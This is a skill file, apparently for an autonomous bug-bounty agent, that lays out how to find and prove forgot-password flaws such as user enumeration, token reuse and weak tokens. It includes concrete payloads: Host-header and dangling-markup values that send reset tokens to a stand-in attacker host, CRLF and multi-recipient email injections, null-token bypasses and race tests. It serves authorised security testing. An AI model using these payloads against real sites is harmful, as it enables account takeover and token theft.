# Upstream source: forgot-password (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/forgot-password/SKILL.md`

---

---
name: forgot-password
description: "Hunt Forgot Password / Account Recovery Authentication Flaws — 5 distinct patterns: (1) username enumeration via different responses for valid vs invalid email, (2) reset token exposed directly in the API response body, (3) reset token not invalidated after use (replay), (4) password reset link works from a different IP/browser (no binding), (5) no rate limit on the reset request endpoint. These are the standalone recovery-flow broken-auth primitives — distinct from reset-email host-header poisoning (host-header) and the full ATO chain (account-takeover owns password-reset as an ATO path; prove the primitive here, chain it there). Detection: trace the full forgot-password flow from request to token to use; check response diffs between valid/invalid emails; test token replay after consumption. Medium to High (enumeration=Medium, token-reuse=High, account-takeover=Critical when chained to known-email)."
---

## Autonomous Testing Priority

**Start with username enumeration — it's the fastest win and gates the rest.**

**Pattern 1 — Username enumeration (response difference for valid vs invalid email):**
1. POST to the forgot-password endpoint with a clearly invalid email (e.g. `nonexistent@fakedomain12345.com`) — record the response body, status code, and length
2. POST with an email you know exists (or try common patterns like `admin@target.com`, `test@target.com`, `user@target.com`)
3. Compare responses: different message ("Email sent" vs "Email not found"), different HTTP status, or meaningfully different body length = username enumeration confirmed
4. Proof: enumeration is confirmed when the two responses differ measurably (baseline vs probe) in message text, status code, or body length

**Pattern 2 — Reset token exposed in the API response:**
Some APIs return the reset token directly in the response body (instead of only emailing it). POST to the forgot-password endpoint and look for a token, link, or code in the JSON/HTML response. If a token appears that lets you reset the password, that's an immediate account-takeover vector.

**Pattern 3 — Reset token replay (reuse after use):**
1. Complete a full password reset cycle: request token → use it to reset password
2. Immediately try submitting the same token again to the reset-password endpoint
3. If the second submission returns 200 or "success" → token not invalidated after use

**Pattern 4 — No rate limit on reset requests:**
Submit the forgot-password endpoint 10-20 times rapidly with the same email. If all succeed without a 429, lockout, or CAPTCHA → no rate limit (enumeration + token flooding is possible).

**Content-type:** Forgot-password endpoints are often JSON-based REST APIs. Use `application/x-www-form-urlencoded` only if the endpoint is a traditional HTML form (check the login page's HTML to determine form encoding).

**Proof:** Username enumeration = measurably different response (body/status/length). Token exposure = token in response body. Token replay = second successful use of a consumed token.

---

## Vulnerability Classes in This Skill

### 1. Username Enumeration via Password Reset
Different error messages for valid vs invalid accounts leaks the user list without authentication. Even timing differences (fast "no user found" vs slow "email queued") count.

High-value targets: admin accounts, employee email patterns, API keys derived from usernames.

### 2. Weak / Predictable Reset Tokens
A reset token derived from timestamp, username, or sequential IDs can be brute-forced:
- `base64(email + timestamp)` — decodable
- 4-6 digit numeric code — 10K guesses, easily feasible with no rate limit
- Sequential `token=1234`, `token=1235` — trivially enumerable

### 3. Token Not Bound to Session or IP
Most apps generate a token, email it, and accept it from any browser. A truly bound token should only work from the same IP or require the original session cookie. If neither is enforced → link forwarding = account takeover.

**Token leak via `Referer` / third-party resources.** When the token rides in the reset-page URL (`/reset?token=…`) and that page loads any cross-origin resource (analytics, ads, fonts, a CDN image), the full URL — token included — leaks to that third party in the `Referer` header. Check the reset page's outbound requests: if the token appears in any cross-origin `Referer`, it's harvestable without the victim's inbox. Same leak via a `<meta name=referrer>` misconfig or an outbound link the victim clicks from the reset page. Disclosed token-leak→ATO class: <https://hackerone.com/reports/173551>.

### 4. Reset Link Doesn't Expire
Common best practice: reset tokens expire within ~15–60 minutes (no hard RFC mandates the exact value; OWASP recommends a short, single-use lifetime). If a token from 24 hours ago still works → persistence risk for phishing attacks.

### 5. No Rate Limit on Reset Endpoint
An uncapped reset endpoint enables:
- Email flooding (DoS against victim's inbox)
- Token brute-force if the token space is small
- Username enumeration at scale

---

## Related Skills

- **`account-takeover`** — owns the account-takeover CHAIN (password-reset is its path #1). This skill finds/proves the recovery-flow primitive; hand off to account-takeover to assemble the full takeover.
- **`web-cache`** — host-header injection during reset email generation (different vulnerability, same flow)
- **`brute-force`** — rate-limit testing pattern applies to the reset endpoint too
- **`auth-bypass`** — if the reset flow can be skipped entirely (go to `/reset-password?token=` with empty/null token)
- **`mfa-and-passwords`** — if MFA is required after reset, test the bypass there

## Web-Research Methodology Additions (2026)

Research basis: the OWASP Forgot Password Cheat Sheet (general practices, URL tokens, recovery after compromise) and HackTricks "Reset/Forgotten Password Bypass." These are the current authoritative checklists; the items below are the attacker-side counterparts of the defenses they prescribe.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Map the whole flow, not just the first request.** Enumerate every hop: `POST /forgot-password` → `/validate-token` → `/reset-password` → `POST /api/account/reset` → `/resend-reset` → post-reset login. Many bugs live only in the second or third hop.
- **Token parameter names:** `token`, `resetToken`, `tempToken`, `recoveryCode`, `code`, `otp`, `pin`, `secret`, `key`, `sid`, `s`. Also check JWT-shaped tokens.
- **Target-account identifiers that should be server-derived but often are not:** `email`, `username`, `user`, `userId`, `user_id`, `accountId`, `login`, `id`, `uid`.
- **URL-construction inputs (poisoning surface):** `Host`, `X-Forwarded-Host`, `X-Host`, `X-Original-Host`, `Forwarded`, `X-Forwarded-Proto`; plus body/query `baseurl`, `base_url`, `return_to`, `redirect_uri`, `redirect_url`, `next`, `domain`, `tenant`, `siteUrl`.
- **Leak channels on the reset page:** outbound analytics/CDN/font/image requests carrying the token in `Referer`; check for a missing `Referrer-Policy: no-referrer` — OWASP explicitly requires it on token URLs.
- **Email-template sinks:** name/firstName/lastName, org/team/workspace/project name, invitation message, ticket title, file name — any field copied into a service-sent email.
- **Parallel/race surface:** "resend link" endpoints, token issue vs. token consume, and any "validate token" endpoint separate from "change password".
- **Wild endpoint spellings:** `hub/rpwd.php`, `/api/v1/account/forgot-password`, `/parents/application/v4/admin/doRegistrationEntries` (registration-as-reset upsert).
- **Timing surface:** per-account rate limiting and uniform response time are the prescribed defenses — any variance is a probe signal.

- **Auth-state interactions:** does completing a reset auto-login (OWASP says don't)? Does it invalidate existing sessions? Does MFA need re-enrolment after reset (NIST recovery guidance)?
- **Response-shape baselines:** capture status, body length, and timing for: invalid email, valid email, malformed email (`a@`), array email, duplicate email params. Diff all four columns.
- **Resend path:** request a reset, then hit "resend" with modified Host/email — several real cases were poisonable only on the resend path.
- **GraphQL/mobile/websocket surface:** query the reset flow through alternate clients; token fields may be named differently there and leak in debug/polling responses.
- **Canary accounts:** keep two test accounts (A attacker, B victim) to prove cross-account token/identifier confusion rather than a self-reset.
- **Recovery-info state:** after reset, are recovery email/phone/MFA methods preserved or replaced? Newly changed recovery info must not be the only proof for account recovery.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Host-header poisoning for link takeover.** Set `Host: attacker.tld` and override headers (`X-Forwarded-Host`, `Forwarded`, `X-Host`, `X-Original-Host`). OWASP says URLs must be hard-coded or allow-listed; a URL built from the header points at you. Note: mail-security scanners and preview services may auto-fetch the link, so the victim need not click.
- **Dangling markup in the Host port field** (when domain tampering 500s but an arbitrary non-numeric port is accepted): `Host: target.net:arbitraryport:'<a href="//attacker.tld/?` — breaks out of the string in the emailed URL and leaks the following token into your query string.
- **"Try using your token" (token/target decoupling).** Keep a token issued for *your* account, then swap the victim identifier in the final step: change `email`/`userId`/`username` only in the change-password request; or split flows so "validate token" uses yours and "change password" uses the victim's.
- **Multi-recipient email divergence.** `email=victim@x&email=attacker@x`; `email=victim@x%20email=attacker@x`; `email[]=victim@x&email[]=attacker@x`; JSON `{"email":["victim@x","attacker@x"]}` or nested `{"user":{"email":[...]}}`; comma lists; CRLF `cc:`/`bcc:` (`email="victim@x%0a%0dcc:attacker@x"`).
- **Missing "token was generated" check.** When the DB default is `NULL`/`""`, try `tempToken=null`, `""`, omit the field, and the literal string `"null"`. Especially effective on new accounts where `tokenExpiry` is initialized at signup.
- **Expired/replay on the API step.** A token rejected by the HTML "validate" page may still be accepted by the JSON endpoint that actually changes the password — always replay against the final API call, not the UI.
- **One-time-token race.** Open the same link in two browsers or fire two parallel `POST /reset` with the same token and different passwords; if both pass, invalidation is not atomic across workers/replicas.
- **Registration-as-reset (upsert).** A signup handler that silently updates an existing email with a supplied password is a pre-auth reset: `{"email":"victim@x","password":"New@12345"}`. Likewise look for `action=change_password` + `user_name` with `skipOldPwdCheck=true`.
- **OTP attempt-counter reset via session rotation** (weak 4-digit codes): rotate the session cookie after N failures; if the counter is session-scoped, brute force becomes feasible. Note the OTP changes too — use randomized guessing, not sequential.
- **Token generation reverse-engineering:** timestamp / userID / email / first+last name / DOB bases; check UUIDv1; compare many tokens in parallel for identical values or constant deltas; quantify with Burp Sequencer (`ent` as fallback).
- **Response manipulation** (swap a bad response for a good one) is worth testing but is usually client-side only — see proof bar.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Gold standard:** request a reset for a test account you control, then actually change that account's password with the captured/forged token and log in. Nothing short of a state change is an ATO.
- **Enumeration:** require a reproducible, *server-state* difference across ≥20 samples. A generic "if the account exists, an email has been sent" is NOT enumeration; differing body length/status/verbatim text is. OWASP also requires uniform timing — measure medians, don't eyeball one request.
- **Poisoning:** an OOB Collaborator hit carrying the victim's *real* token is the proof. A modified link in an email you can read is only a prerequisite; demonstrate token capture from a victim-context request.
- **Race/reuse:** show two different passwords both accepted for one token, or the same consumed token working twice — not merely two 200s.
- **Avoid false positives:** (1) client-side response manipulation alone does not prove server-side misbehavior; (2) a token echoed into a response your own unauthenticated request triggered is high-severity, but a token visible only after login to the owner is expected; (3) an expired token accepted only on a UI step but rejected by the final API is not a finding; (4) "password stored in recoverable format" is a different class — report as such.
- **Post-reset hygiene (impact, not the bug):** confirm whether old sessions and outstanding reset links are invalidated; OWASP's recovery-after-compromise section makes this explicit.

- **Cross-account proof:** for identifier confusion, change the password of test account B using a token issued to A, then log in as B. A self-reset proves nothing.
- **Resend-path confirmation:** if poisoning works only on resend, say so explicitly — it is still a finding.
- **Auto-login/session check:** after a successful reset, test whether the old session remains valid; OWASP requires invalidating sessions and outstanding reset links after recovery.
- **MFA-after-reset:** confirm whether the reset bypasses MFA — that is a separate (higher) impact and belongs in the MFA chain.
- **Token entropy evidence:** Burp Sequencer effective-bits or a decoded timestamp/counter — "looks short" is not evidence.
- **Bounty-report note:** cite the primitive here (enumeration, token reuse, poisoning) and hand the full takeover chain to `account-takeover`; don't claim ATO from enumeration alone.
- **Resend-vs-first-request evidence:** if both paths are poisonable, show which one leaks the token; if only one, include both request captures in the report.
- **Uniform-response check:** OWASP requires both message consistency and timing consistency — a correct-looking message that arrives 150ms faster for existing accounts is still enumeration.

### D. Sources — numbered list of URLs you actually fetched

1. https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
2. https://hacktricks.wiki/en/pentesting-web/reset-password.html
